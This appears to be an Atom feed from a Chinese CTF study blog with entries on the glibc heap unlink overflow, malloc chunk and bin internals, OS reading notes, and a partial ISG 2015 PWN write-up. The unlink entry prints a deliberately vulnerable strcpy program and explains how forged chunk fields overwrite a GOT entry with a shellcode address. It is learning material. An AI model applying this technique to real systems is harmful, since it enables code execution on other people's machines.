<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ruozhi</title>
  
  <subtitle>如题</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://liey1.github.io/"/>
  <updated>2018-10-27T14:46:04.351Z</updated>
  <id>https://liey1.github.io/</id>
  
  <author>
    <name>ruozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>堆溢出1 -- unlink</title>
    <link href="https://liey1.github.io/2018/10/27/heap_unlink/"/>
    <id>https://liey1.github.io/2018/10/27/heap_unlink/</id>
    <published>2018-10-27T14:31:10.074Z</published>
    <updated>2018-10-27T14:46:04.351Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[原文][1]</span><br><span class="line"></span><br><span class="line">照着这篇文章写的，不算翻译吧（毕竟我英文差的**）</span><br></pre></td></tr></table></figure><h3 id="这篇文章将学习怎么使用-unlink-来进行堆溢出，先看看漏洞程序："><a href="#这篇文章将学习怎么使用-unlink-来进行堆溢出，先看看漏洞程序：" class="headerlink" title="这篇文章将学习怎么使用 unlink 来进行堆溢出，先看看漏洞程序："></a>这篇文章将学习怎么使用 unlink 来进行堆溢出，先看看漏洞程序：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/* </span><br><span class="line"> Heap overflow vulnerable program. </span><br><span class="line"> */</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main( int argc, char * argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        char * first, * second;</span><br><span class="line"></span><br><span class="line">/*[1]*/ first = malloc( 666 );</span><br><span class="line">/*[2]*/ second = malloc( 12 );</span><br><span class="line">        if(argc!=1)</span><br><span class="line">/*[3]*/         strcpy( first, argv[1] );</span><br><span class="line">/*[4]*/ free( first );</span><br><span class="line">/*[5]*/ free( second );</span><br><span class="line">/*[6]*/ return( 0 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[3] 中 没有将 argv<a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/" target="_blank" rel="noopener">1</a> 复制进堆块 first 中且没有任何限制，因此当用户输入一个大于 666 字节就会覆盖下一个 chunk。这将造成任意代码执行。</p><p>这个技术的主要思想是 将 GOT 入口覆盖成 shellcode 地址，当 [5] 执行时，shellcode 就会被执行了。</p><p>首先分析下 <code>glibc malloc</code> 在 free 的时候都做了什么吧。</p><p>默认情况下（不影响 second 块的情况下），在 [4] 中做了如下操作：</p><pre><code>1. 非 mmap 的 chunk，合并 前/后 的块2. 合并上一个块：    * 如果当前释放的 chunk 中的 P 位为 0，在 bins 中 unlink 上一个块，将当前块的大小增加上上一个块的大小 并且 将当前块指向上一个块。    * 在这个例子中 P 位为 1，第一个块默认的 P 位都为 1，尽管上一个块不存在。3. 合并下一个块：    * 当下一个块为 free 时，将下一个 chunk 从 binlist 中移除并且将当前块的大小加上下一个块的大小。（在这里例子中下一个块为 second，所以也不会合并）    * 有意思的是，获取下一个块是否为 free 是根据下下个块的 P 位来决定的。4. 然后添加 合并后的块 到  unsorted bin 中。在这里例子中没有发生合并，所以只用将  first 添加到 unsorted bin 就好。</code></pre><p>下面说说攻击者在第三行中覆盖 second 这块内存的内容：</p><ul><li>prev_size = 覆盖成偶数（使 PREV_INUSE 位为 0）</li><li>size = -4</li><li>fd = free address -12</li><li>bk = shellcode address</li></ul><p>在攻击者的用向下，[4] 做了如下事：</p><ol><li>合并上下堆块</li><li>合并上一个块：和上面分析的一样，不再重复</li><li>合并下一个块：<br> 判断下一个块是否为空闲，前面提到过是根据下下个块的 P 位来判断的。那么怎么找到下下个块的地址呢？就是：下一个块的地址+下一个块大小。在这里我们把下一块的大小变成了-4，所以他 下一块的地址（prev_size）+（-4） 又指向了自己（我指我自己）</li></ol><hr><p>戛然而止，回顾一下 unlink 的过程：</p><pre><code>1. 首先传入要 unlink 的堆块，假定变量 P2. BK = P-&gt;bk,FD = P-&gt;fd // 将 P 的 bk 和 fd 分别给 BK 和 FD 变量3. FD-&gt;bk = BK, BK-&gt;fd = FD（因为用文字太绕了。）4. //用文字描述就是：当前块的上一个块的下一个块（即：(P-&gt;bk)BK-&gt;fd） 等于 当前块的下一块。下一块的上一块同理。</code></pre><p>来张图比什么都清晰：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/10/27/18118dc040318ddb80925a647dcc57c0.png" alt="unlink过程图"> —此图来自 ctf-wiki</p><hr><p>回到上面（我指我自己处）：<br>此时的堆应该是这样的：</p><blockquote><p>next chunk</p></blockquote><table><thead><tr><th>字段</th><th>–1—</th><th>值</th></tr></thead><tbody><tr><td>prev_size</td><td>—–</td><td>偶数（最后一位为 P 位，只要是偶数最后一位就为 0，因此偶数即可）</td></tr><tr><td>size</td><td>—–</td><td>-4 （减去4，指向了自己）</td></tr><tr><td>fd</td><td>—–</td><td>GOT入口-12</td></tr><tr><td>bk</td><td>—–</td><td>shellcode 地址</td></tr></tbody></table><p><code>回顾一下前面的[4]：free(first)</code></p><blockquote><p>执行这句话的时候发生了什么？</p></blockquote><ol><li>释放掉 first 块</li><li>判断上一个块是否空闲，在这里不是空闲的，所以跳过</li><li>判断下一个块是否空闲，在这里判断的是 second 块，原本应该是 非空闲 的，but 这里的 size 是 -4，所以取下下块的时候又跑到了自己块的 prev_size 处，这里的值是偶数，所以 P 位为0，所以就未占用咯，所以要合并咯，合并就要用到 unlink 咯。</li></ol><blockquote><p>那么在这里 unlink 都做了什么呢？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(GOT入口-12)FD = P-&gt;fd</span><br><span class="line">(shellcode地址)BK = P-&gt;bk</span><br><span class="line">（GOT入口表【因为 bk 相距 prev_size 12 字节】）FD-&gt;bk = BK </span><br><span class="line">（这里是什么不重要了，但是此处的内容也会被破坏，所以要注意）BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>在这里 GOT 入口表被覆盖成 shellcode 了。</p><p>至此，unlink 的利用就算结束了，下篇文章分析一道，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line">while True:</span><br><span class="line">    print &quot;特别特别特别&quot;</span><br></pre></td></tr></table></figure></p><p>简单的题目。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>堆笔记1</title>
    <link href="https://liey1.github.io/2018/10/22/%E5%A0%86%E7%AC%94%E8%AE%B01/"/>
    <id>https://liey1.github.io/2018/10/22/堆笔记1/</id>
    <published>2018-10-21T16:48:41.864Z</published>
    <updated>2018-10-27T04:15:50.141Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-什么是-chunk"><a href="#1-什么是-chunk" class="headerlink" title="1. 什么是 chunk"></a>1. 什么是 chunk</h3><p>由 malloc 申请的内存称为 chunk</p><h3 id="2-chunk-结构"><a href="#2-chunk-结构" class="headerlink" title="2. chunk 结构"></a>2. chunk 结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize</span><br></pre></td></tr></table></figure><blockquote><p>chunk 字段解释</p></blockquote><p>prev_size ： 如果前一个chunk空闲，则该字段表示前一个chunk的大小。如果前一个chunk 非空闲状态，则此处作为前一个 chunk 的数据部分（即被前一个chunk使用）。</p><p>size ： 记录当前块的大小，必须为 2 * SIZE_T 的整数倍（SIZE_T 在32位为4，64位为8）该字段的低三位和大小没关系，分别为：</p><pre><code>1. NON_MAIN_ARENA 记录该 chunk 是否属于主线程2. IS_MAPPED  记录当前 chunk 是否由 mmap 分配3. PREV_INUSE 记录前一个 chunk 是否被分配（第一个被分配的 chunk 的 P位都会设置成 1，防止访问前面的非法内存）。当该位为 0 时，可以用 prev_size 字段获得上个 chunk 的大小和地址。也方便空闲块的合并</code></pre><p>fd： 如果该 chunk 被分配，从此处开始就是用户的数据，否则指向上一个空闲 chunk<br>bk： 指向上一个空闲的 chunk</p><p>fd_nextsize： 指向前一个与当前 chunk 大小不同的空闲块<br>bk_nextsize： 指向后一个与当前 chunk 大小不同的空闲块</p><h2 id="3-bins"><a href="#3-bins" class="headerlink" title="3. bins"></a>3. bins</h2><blockquote><p>什么是 bins</p></blockquote><p>用户释放掉的 <code>chunk</code> 不会立马归还给系统，而是程序保留管理着，这样下次再分配时无需系统调用，节省资源。</p><p>ptmalloc 将 chunk 分为四类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fast bins</span><br><span class="line">unsorted bins</span><br><span class="line">small bins</span><br><span class="line">large bins</span><br></pre></td></tr></table></figure></p><p>对于后三个 bins，ptmalloc 将他们分在同一个数组中，结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define NBINS 128</span><br><span class="line">/* Normal bins packed as described above */</span><br><span class="line">mchunkptr bins[ NBINS * 2 - 2 ];</span><br></pre></td></tr></table></figure></p><p>数组中的 bins 顺序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 数组第一个为 unsorted bin ，没有排序，内部 chunk 比较杂</span><br><span class="line">2. 数组中第 2 到 63 个为 small bin ， 同一个 small bin 链中的大小相同，两个相邻的 small bin 链中的大小相差字节数为 2*机器字长（即 32 位相差8 ，64位相差 16）</span><br><span class="line">3. 后面的为 large bins，chunk 的 fd 按从大到小排序。</span><br></pre></td></tr></table></figure></p><p>当然还有上面提到的 fast bins，ptmalloc 为了提高分配速度，会把一些小的 bins 分配到 fast bins 中，fast bins 中的每个 P 位（chunk 的使用标记）都被设置为 1，所以不会被合并起来。</p><h2 id="4-bins-们"><a href="#4-bins-们" class="headerlink" title="4. bins 们"></a>4. bins 们</h2><h3 id="4-1-fast-bin"><a href="#4-1-fast-bin" class="headerlink" title="4.1 fast bin"></a>4.1 fast bin</h3><p>为了提高分配效率而设计的 fast bin 将存储一些较小的内存块，它们的 <code>使用位</code><br>永远被置为 1，所以不会被合并起来。</p><p>看两个宏：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ifndef DEFAULT_MXFAST</span><br><span class="line">#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span><br><span class="line"></span><br><span class="line">#define set_max_fast(s)                                                        \</span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure></p><ol><li>ptmalloc 首先会调用 <code>set_max_fast</code> 并把 <code>DEFAULT_MXFAST</code>  传进去，也就是设置 fast bins 中 chunk 的最大值。</li><li>MAX_FAST_SIZE 为 0 时，系统就不会支持 fastbin 。</li><li>当申请空间一个小于或等于 <code>global_max_fast</code> 时，ptmalloc 首先会在 fast bin 查询是否有合适大小的块。</li></ol><p>再来看个东西：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span><br></pre></td></tr></table></figure></p><p>当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后大于 <code>FASTBIN_CONSOLIDATION_THRESHOLD</code>，表明内存碎片比较多了，我们就需要把 <code>fast bins</code> 中的 chunk 都进行合并。</p><p><code>malloc_consolidate</code> 函数可以释放后所有 fastbins 并且将他们和其他的 空闲块 合并。</p><h3 id="4-2-small-bin"><a href="#4-2-small-bin" class="headerlink" title="4.2 small bin"></a>4.2 small bin</h3><p>small bins 有 62 个双向链表，每个链表存储的大小都一致。</p><p>small bins 中每个链表的大小都有规律，即：chunk_size = 2<em>SIZE_INDEX</em>index，例如在 32 位系统下下标为 <code>2</code> 的链表的大小为 2<em>4</em>2 = 16 个字节。</p><p>当然，fast bin 中的 chunk 是有可能会被放到 small bin 中去的，因为他们确实有些重合了。</p><h3 id="4-3-large-bin"><a href="#4-3-large-bin" class="headerlink" title="4.3 large bin"></a>4.3 large bin</h3><ol><li>large bins 共有 63个 bin，每个 bin 中的大小不一致，但有个差值。</li><li>每个 bin 中的 chunk 大小之间公差一致。</li><li>第一个 large bin 的起始 chunk 大小为 512 字节，该组公差为 64B，所以该组可以存储 chunk 的大小范围为： [512,512+64)</li></ol><h3 id="4-4-unsorted-bin"><a href="#4-4-unsorted-bin" class="headerlink" title="4.4 unsorted bin"></a>4.4 unsorted bin</h3><ol><li>乱序的 bins</li><li>放进 unsorted bin 的 chunk 来自：<ol><li>分割完大块后剩余部分，并且该部分要大于 MINSIZE</li><li>释放不属于 fast bin 的 chunk 并且 该 chunk 不和 top chunk 紧邻。</li></ol></li></ol><h3 id="4-5-top-chunk"><a href="#4-5-top-chunk" class="headerlink" title="4.5 top chunk"></a>4.5 top chunk</h3><ol><li>简单理解就是在地址最高的一个 chunk，不属于任何 bins。</li><li>当程序需要分配的内存大小在 bins 中都不满足的情况下，尝试用 <code>top chunk</code> 给程序分配，如果够，则剩余部分继续做 <code>top chunk</code>，如果不够，则申请扩展内存后再分配。</li><li>当邻近 <code>top chunk</code> 的 <code>chunk</code> 被释放后，会合并到 <code>top chunk</code> 中</li></ol><h3 id="4-6-last-remainder"><a href="#4-6-last-remainder" class="headerlink" title="4.6 last remainder"></a>4.6 last remainder</h3><ol><li>当在 <code>small chunk</code> 找不到合适的块时，如果 <code>last remainder chunk</code> 大于要分配的内存，则分割这个 <code>chunk</code> 给用户并将剩余部分继续作为 <code>last remainder chunk</code>，该块好像是放在 <code>unsorted bins</code> 中的。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-什么是-chunk&quot;&gt;&lt;a href=&quot;#1-什么是-chunk&quot; class=&quot;headerlink&quot; title=&quot;1. 什么是 chunk&quot;&gt;&lt;/a&gt;1. 什么是 chunk&lt;/h3&gt;&lt;p&gt;由 malloc 申请的内存称为 chunk&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-第一页</title>
    <link href="https://liey1.github.io/2018/09/24/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E7%AC%AC%E4%B8%80%E9%A1%B5/"/>
    <id>https://liey1.github.io/2018/09/24/程序员的自我修养-第一页/</id>
    <published>2018-09-24T12:18:19.775Z</published>
    <updated>2018-09-24T14:59:37.551Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="1-2-万变不离其宗"><a href="#1-2-万变不离其宗" class="headerlink" title="1.2 万变不离其宗"></a>1.2 万变不离其宗</h2><blockquote><p>讲了南桥北桥PCI</p></blockquote><p><code>看不懂看不懂。</code></p><blockquote><p>SMP 与多核</p></blockquote><p>什么是 <code>SMP</code>：对称多处理器（Symmetrical Multi-Processing），就是多个 <code>CPU</code> 咯。<br>什么是 <code>多核</code>：两个 <code>CPU</code> 你也买不起，所以良心的资本家们将 <code>CPU</code> 中的 缓存部件共享（据说是比较贵），把核心保留起来。即:<code>多个核心+一个缓存部件</code></p><p><code>除非你想把 CPU 的每一滴油水都榨干，否则可以把多多核和 SMP 看成同一个概念</code></p><p>为什么不升级 CPU 本身而添加多核来提速呢？</p><p>因为人们在制造 CPU 的工艺方面已经达到了物理极限，除非制造工艺有本质的突破。否则 <code>4GHZ</code> 就是 CPU 的天花板了。</p><h2 id="1-3-站得高，望得远"><a href="#1-3-站得高，望得远" class="headerlink" title="1.3 站得高，望得远"></a>1.3 站得高，望得远</h2><p><code>Any problem in computer science can be solved by another layer of indrection.</code></p><p>这节应该是强调了接口的概念：</p><h3 id="接口？"><a href="#接口？" class="headerlink" title="接口？"></a>接口？</h3><blockquote><p>什么是接口？</p></blockquote><p>下层实现，上层使用。</p><p>比如类库中封装了 <code>printf</code> 函数。写代码的时候无需考虑 <code>printf</code> 用汇编的实现方式。所以 Windows 的 C 代码到了 Linux 依然可以编译，即使底层实现 <code>printf</code> 的方法不同（应该不同吧？）</p><p>什么是 <code>硬件规格</code>：驱动程序操作硬件的 <code>接口</code>，定义了如何与硬件通信</p><h2 id="1-4-操作系统做什么"><a href="#1-4-操作系统做什么" class="headerlink" title="1.4 操作系统做什么"></a>1.4 操作系统做什么</h2><h3 id="1-41-别让-CPU-打盹"><a href="#1-41-别让-CPU-打盹" class="headerlink" title="1.41 别让 CPU 打盹"></a>1.41 别让 CPU 打盹</h3><blockquote><p>多道程序的出现</p></blockquote><p>什么是多道程序呢： 聪明的程序员为了让 CPU 忙碌起来，写了个监控程序，当当前程序暂时无需使用 CPU 时（读写硬盘），监控程序就把 CPU 让给正在等待的程序。这就是多到程序。</p><p>多道程序的缺点： 没有优先级，所以有些很急的任务要等很久。想象一下如果点击一下鼠标，十分钟之后才等到 CPU 处理。。</p><blockquote><p>进化成分时系统吧</p></blockquote><p>什么是分时系统： 每个程序在运行一段时间后，程序 <code>主动</code> 让出 CPU 给其他程序。Windows早期版本（如 <code>Windows 3.1</code> 就是这种模式）。程序调用系统接口 <code>Yield 、GetMessage、PeekMessage</code> 时，<code>Window3.1</code> 会判断是否有其他程序正在等待 <code>CPU</code> ，如果有，就暂停当前程序，把 <code>CPU</code> 让给其他程序。</p><p>分时系统缺点： 但是，注意这是程序 <code>主动</code> 让出 <code>CPU</code> 啊。程序要是 <code>while(1)</code> 那你可咋办哟~</p><blockquote><p>多任务系统才是王道啊</p></blockquote><p>什么是多任务系统： 操作系统接管了所有硬件资源并且本身运行在一个受硬件保护的级别。所有应用程序都以 <code>进程</code> 的方式运行在比操作系统权限更低的级别（作弊了呀）。</p><p><code>抢占式</code>是什么： CPU 由操作系统分配。每个进程根据优先级都有机会得到 CPU。但如果运行超过一定时间，系统会暂停该进程，将 CPU 资源分配给其他正在等待的程序。</p><p>（这个模式是操作系统强制剥夺 CPU 资源啊~）</p><p>多任务的缺点： 书中没说他有缺点，那就当他没有缺点吧。</p><h3 id="1-42-设备驱动"><a href="#1-42-设备驱动" class="headerlink" title="1.42 设备驱动"></a>1.42 设备驱动</h3><blockquote><p>这一小节看的我想死，所以没有笔记</p></blockquote><h2 id="1-5-内存不够怎么办？"><a href="#1-5-内存不够怎么办？" class="headerlink" title="1.5 内存不够怎么办？"></a>1.5 内存不够怎么办？</h2><p>早期程序是直接运行在物理内存的。</p><p>假设当前计算机物理空间有 128M ，<code>程序A</code> 需要 10M， <code>程序B</code> 需要 100M，<code>程序C</code> 需要 20M，如果需要同时运行 A 和 B，那么可以很直接的将物理内存中 0-10M 分配给 A，10-110 分配给 B。</p><p>很明显会造成很多问题：</p><ol><li><p>地址空间不隔离<br>所有程序都直接访问物理内存，程序A 可以直接访问 程序B 的数据甚至代码。 </p></li><li><p>使用效率低<br>由于没有管理机制，所以如果现在要运行 C 的话。需要将其他程序暂时移到磁盘里去。但是程序需要连续的空间，所以移动 A 肯定是不够的，所以只能移 B。可以看到整个过程有大量的数据在换入换出，导致效率十分低下</p></li><li><p>运行的地址不确定<br>每次分配的空间地址都不确定，但是数据和跳转时的目标地址都是固定的。这就涉及到重定向的问题了，会在以后讨论</p></li></ol><h3 id="1-51-关于隔离"><a href="#1-51-关于隔离" class="headerlink" title="1.51 关于隔离"></a>1.51 关于隔离</h3><p>第一个问题就是隔离，怎么解决呢？</p><p>聪明的程序员们建立了一个概念：虚拟地址空间。</p><p>虚拟地址空间：假的，不存在的。每个进程只能访问自己的地址空间，有效的做到了隔离<br>物理地址空间：和名字一样，物理存在的。如果地址线有 32 条，那么物理空间就有 2^32 字节（4G）。但是如果你只装了 512 MB 的内存，那物理地址的有效部分为： 0x00000000 ~ 0x1FFFFFFF</p><h3 id="1-52-分段"><a href="#1-52-分段" class="headerlink" title="1.52 分段"></a>1.52 分段</h3><p>分段的基本概念：说回上面的 程序 A 和 程序 B。假设有一个 地址从 0x0000000 到 0x00A00000 的 10M 虚拟空间。然后在物理地址中挑选一块相同大小的空间：0x00110000 到 0x00B10000，将这两块地址空间一一映射。（由软件映射，别问什么软件）</p><p>这里解决了上面提到的 第一个 和 第三个问题：两块没有重叠的空间，当 A 访问超出 0x00A0000 的时候，硬件就会判断这是个非法访问。 </p><blockquote><p>局部性原理</p></blockquote><p>但是第二个问题还是没变啊，依然是每个整个程序的搬入搬出。<br>聪明的程序员总是有解决办法，他们发现：当一个程序运行时，在某个时间段内，只是频繁的使用一小部分数据，也就是说很多数据一段时间内不会被访问到，这就是 tmd <code>局部性原理</code>。</p><p>怎么利用起来了呢？程序员们给方法起了个名：<code>分页</code>。</p><h3 id="1-53-分页"><a href="#1-53-分页" class="headerlink" title="1.53 分页"></a>1.53 分页</h3><p>分页的就是把地址空间人为的分成固定大小的页，页的大小由硬件决定，或者硬件支持多种大小的页，由操作系统选择。</p><p>加载一个程序时先将程序虚拟地址分页，然后将常用的页映射到物理内存，不常用的存在磁盘中（不同程序的有些虚拟页被映射到同一个物理页，实现内存共享）。</p><p>那要访问磁盘中的页时怎么办呢？此时硬件捕获到一个信息：<code>页错误</code>，然后阻塞该程序，将磁盘中的页换入内存中。</p><p>当然也要保护页啦，就好像上面提到的 两个程序用到同一个页时，这个页最好是不能被修改的，不然其中一个修改，另一个可能就读不到想要的数据/代码。每个页都可以设置权限属性，修改这些属性的权限也只有操作系统有。详细的介绍会放在日后。。。（不是我想放在日后）</p><p>虚拟内存的实现需要依靠硬件支持，对不同 CPU 来说是不同的，但是几乎所有的硬件都采用一个叫 MMU 的部件进行页映射，CPU 发出 虚拟地址 经过 MMU 转换成实际地址。 MMU 一般都集成在 CPU 内部。</p><h2 id="1-6-众人拾材火焰高"><a href="#1-6-众人拾材火焰高" class="headerlink" title="1.6 众人拾材火焰高"></a>1.6 众人拾材火焰高</h2><h3 id="1-61-线程基础"><a href="#1-61-线程基础" class="headerlink" title="1.61 线程基础"></a>1.61 线程基础</h3><p>一个标准的线程有：线程ID，当前指令指针，寄存器集合和堆栈。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;1-2-万变不离其宗&quot;&gt;&lt;a href=&quot;#1-2-万变不离其宗&quot; class=&quot;headerlink&quot; title=&quot;1.2 万变不离其宗&quot;&gt;&lt;/a&gt;1.2 万变不离其宗&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;讲了南桥北桥PCI&lt;/p&gt;
&lt;/bloc
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://liey1.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>一道简单的 PWN 题</title>
    <link href="https://liey1.github.io/2018/09/11/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%20PWN%20%E9%A2%98/"/>
    <id>https://liey1.github.io/2018/09/11/一道简单的 PWN 题/</id>
    <published>2018-09-10T18:03:35.220Z</published>
    <updated>2018-10-21T16:51:00.625Z</updated>
    
    <content type="html"><![CDATA[<p>这道貌似是 ISG 2015 年的题了。。</p><h4 id="本题WP"><a href="#本题WP" class="headerlink" title="本题WP"></a><a href="https://blog.csdn.net/csalp/article/details/49956179" target="_blank" rel="noopener">本题WP</a></h4><hr><p>问题：</p><p>跟着栈溢出，将 <code>EIP</code> 覆盖成 write 函数的 <code>plt</code> 值，紧接着 <code>read</code> 的 <code>plt</code> 值，这里让我不解的是：</p><p>为什么 <code>read</code> 的函数被执行了。猜测应该是 <code>write</code> 函数中自带了 <code>ret</code> 指令。明天争取学会用 <code>gdb</code> 调试进 <code>write</code> 函数中吧。</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/11/6f86787e404d258e803864226710110b.png" alt="跟着塔主学PWN_1"></p><hr><p>  接上。。尝试用 <code>gdb</code> 进入 <code>write</code> 函数。但是：</p><p>  <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/637ed82540b56bdf80bfce25de0d6fa9.png" alt="跟着塔主学PWN_1"></p><p>  问了表哥后，表哥来了个姿势：先运行，在输入的时候按 <code>CTRL+C</code> （之前确实没学过 <code>gdb</code> ）</p><p> 但是这里，可以整个更直接的：<code>b write</code></p><blockquote><p>运行&gt;</p></blockquote><p> 进入到 <code>write</code> 函数内，首先看看怎么取参数：</p><p> <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/b5e1013340d283a4807f40f5a4ae1930.png" alt="跟着塔主学PWN_2"></p><p> 等会再讲。。</p><p> 再看看最后，发现确实用的 <code>ret</code>（废话，不用 <code>ret</code> 怎么返回）</p><p> <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/7b9cebf440d477cf80aabfd4e5f027ac.png" alt="跟着塔主学PWN_3"></p><hr><blockquote><p>切入这道题。。。</p></blockquote><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><hr><blockquote><p>首先丢进 <code>ida</code> 里看看</p></blockquote><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/28e6acc54052fee98034609d2c195954.png" alt="跟着塔主学PWN_4"></p><p>很明显的一个缓冲区溢出。。（我也只会缓冲区溢出了）</p><p>这里写的 变量 <code>v1</code> 离 <code>ebp</code> 为 <code>0xC(12)</code> 个位置，但是实际测试为 <code>0x10(16)</code> 个位置。</p><p>这里玩个好玩的。。我们可以用 <code>gdb_pattern</code> 生成一些字符串，发送出去后查看 <code>EIP</code>。将此时的 EIP 记录下来再用 <code>gdb_offset</code> 查看偏移位置，这就是变量离 <code>EIP</code> 的位置了：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/cbd6e6064087ae7a807b1e052d714dcc.png" alt="跟着塔主学PWN_5"></p><p>现在我们知道是离 20 个位置。我们可以先溢出玩玩，这里 <code>checksec</code> 发现开启了 <code>NX</code> 。我们可以先用 <code>write</code> 函数试试水。比如就打印 <code>ida</code> 代码中 第 <code>6</code> 行的 <code>write(1, &quot;Welcome to ISG 2015!\nPwn me to get the flag:\n&quot;, 0x2Du);</code></p><p>在 <code>ida</code> 中看看 <code>plt</code> 的 <code>write</code> 地址：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/cd856871401be1558081881ce8cb5aed.png" alt="跟着塔主学PWN_6"></p><p>再在 <code>qira</code> 中看看 <code>welcome to isg..</code> 这段字符串在哪：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/f92b00cc4035903880a75c1c61781027.png" alt="跟着塔主学PWN_7"></p><p>因为之前调用的 <code>write</code> 函数就是输出这段字符串，所以这个地址就是那段字符串的地址咯。。</p><blockquote><p>整理一下：</p></blockquote><p>初始栈的结构：</p><table><thead><tr><th>相对地址</th><th>对应值</th></tr></thead><tbody><tr><td>0x0</td><td>变量 